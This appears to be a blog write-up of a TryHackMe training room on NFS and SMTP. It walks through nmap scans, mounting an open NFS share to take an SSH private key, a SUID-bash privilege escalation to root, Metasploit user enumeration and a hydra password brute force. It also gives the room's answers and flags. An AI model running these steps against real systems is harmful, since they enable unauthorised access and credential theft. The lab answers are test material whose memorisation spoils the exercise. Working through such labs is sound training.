---
layout: post
title: Network Services 2 Room Writeup
categories: [TryHackMe]
tags: [Writeup]
---

# TryHackMe: Network Services 2 Room Writeup

> Enumerating and Exploiting More Common Network Services & Misconfigurations

### Task 2

**What does NFS stand for?**

> Network File System

**What process allows an NFS client to 
interact with a remote directory as though it was a physical device?**

> mounting

**What does NFS use to represent files and directories on the server?**

> file handle

**What protocol does NFS use to communicate between the server and client?**

> RPC

**What two pieces of user data does the NFS server take as parameters for 
controlling user permissions? Format: parameter 1 / parameter 2**

> user ID / group ID

**Can a Windows NFS server share files with a Linux client? (Y/N)**

> Y

**Can a Linux NFS server share files with a MacOS client? (Y/N)**

> Y

**What is the latest version of NFS? [released in 2016, but is still up to date as of 2020] This will require external research.**

> 4.2

### Task 3

**Conduct a thorough port scan scan of your choosing, how many ports are open?**

In practice, when you use nmap to scan a huge range of ports, it can take really a long time. So instead of setting up a huge port range, we can divide it into several ranges to make the scanning time short.

```
nmap -A -p1-10000 10.10.186.1
nmap -A -p10001-20000 10.10.186.1
nmap -A -p20001-30000 10.10.186.1
nmap -A -p30001-40000 10.10.186.1
nmap -A -p40001-50000 10.10.186.1
```

> 7

**Which port contains the service we're looking to enumerate?**

> 2049

**Now, use /usr/sbin/showmount -e [IP] to list the NFS shares, what is the name of the visible share?**

```
showmount -e 10.10.186.1
```

> /home

**Change directory to where you mounted the share- what is the name of the folder inside?**

```
mkdir /tmp/mount
mount -t nfs 10.10.186.1:/home /tmp/mount/ -nolock
cd /tmp/mount/
ls
```

> cappucino

**Which of these folders could contain keys that would give us remote access to the server?**

> .ssh

**Which of these keys is most useful to us?**

> id_rsa

**Can we log into the machine using *ssh -i <key-file> <username>@<ip>* ? (Y/N)**

```
cp id_rsa ~
cd ~
chmod 600 id_rsa
ssh -i id_rsa cappucino@10.10.186.1
```

> Y

### Task 4

**Now, we're going to add the SUID bit permission to the bash executable 
we just copied to the share using "sudo chmod +[permission] bash". What 
letter do we use to set the SUID bit set using chmod?**

```
chmod +s bash
```

> s

**Let's do a sanity check, let's check the
 permissions of the "bash" executable using "ls -la bash". What does the
 permission set look like? Make sure that it ends with -sr-x.**

```
chmod +x bash
ls -la bash
```

> rwsr-sr-x

**Now, SSH into the machine as the 
user. List the directory to make sure the bash executable is there. Now,
 the moment of truth. Lets run it with "*./bash -p*". The -p persists the permissions, so that it can run as root with SUID- as otherwise bash will sometimes drop the permissions.**

```
ssh -i id_rsa cappucino@10.10.186.1
./bash -p
```

Now we have entered into a root shell.

> No answer needed

**Great! If all's gone well you should have a shell as root! What's the root flag?**

Change to root home directory, then you can find a text file containing the flag.

```
cd /root
cat root.txt
```

> THM{nfs_got_pwned}

### Task 5

**What does SMTP stand for?**

> Simple Mail Transfer Protocol

**What does SMTP handle the sending of? (answer in plural)**

> emails

**What is the first step in the SMTP process?**

> SMTP handshake

**What is the default SMTP port?**

> 25

**Where does the SMTP server send the email if the recipient's server is not available?**

> SMTP queue

**On what server does the Email ultimately end up on?**

> POP/IMAP

**Can a Linux machine run an SMTP server? (Y/N)**

> Y

**Can a Windows machine run an SMTP server? (Y/N)**

> Y

### Task 6

**First, lets run a port scan against the target machine, same as last time. What port is SMTP running on?**

```
nmap -A -p1-10000 10.10.59.93
```

> 25

**Okay, now we know what port we should be targeting, let's start up Metasploit. What command do we use to do this?**

**If
 you would like some more help, or practice using, Metasploit, Darkstar 
has an amazing room on Metasploit that you can check out here:**

https://tryhackme.com/room/rpmetasploit

```
msfconsole
```

> msfconsole

**Let's search for the module "smtp_version", what's it's full module name?**

```
search smtp_version
```

> auxiliary/scanner/smtp/smtp_version

**Great, now- select the module and list the options. How do we do this?**

```
options auxiliary/scanner/smtp/smtp_version
```

> options

**Have a look through the options, does everything seem correct? What is the option we need to set?**

> RHOSTS

**Set that to the correct value for your target machine. Then run the exploit. What's the system mail name?**

```
set RHOSTS 10.10.59.93
use auxiliary/scanner/smtp/smtp_version
exploit
```

> polosmtp.home

**What Mail Transfer Agent (MTA) is running the SMTP server? This will require some external research.**

> Postfix

**Good! We've now got a good amount of 
information on the target system to move onto the next stage. Let's 
search for the module "*smtp_enum*", what's it's full module name?**

```
search smtp_enum
```

> auxiliary/scanner/smtp/smtp_enum

**We're going to be using the *"top-usernames-shortlist.txt"* wordlist from the Usernames subsection of seclists (/usr/share/wordlists/SecLists/Usernames if you have it installed).**

**Seclists
 is an amazing collection of wordlists. If you're running Kali or Parrot
 you can install seclists with: "sudo apt install seclists" 
Alternatively, you can download the repository from [here](https://github.com/danielmiessler/SecLists).**

**What option do we need to set to the wordlist's path?**

```
options auxiliary/scanner/smtp/smtp_enum
set USER_FILE /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt
```

> USER_FILE

**Once we've set this option, what is the other essential paramater we need to set?**

```
set RHOSTS 10.10.59.93
```

> RHOSTS

**Now, run the exploit, this may take a few minutes, so grab a cup of tea, coffee, water. Keep yourself hydrated!**

```
use auxiliary/scanner/smtp/smtp_enum
exploit
```

> No answer needed

**Okay! Now that's finished, what username is returned?**

> administrator

### Task 7

**What is the password of the user we found during our enumeration stage?**

```
hydra -t 16 -l administrator -P /usr/share/wordlists/rockyou.txt -vV 10.10.59.93 ssh
```

> alejandro

**Great! Now, let's SSH into the server as the user, what is contents of smtp.txt**

```
ssh administrator@10.10.59.93
cat smtp.txt
```

> THM{who_knew_email_servers_were_c00l?}
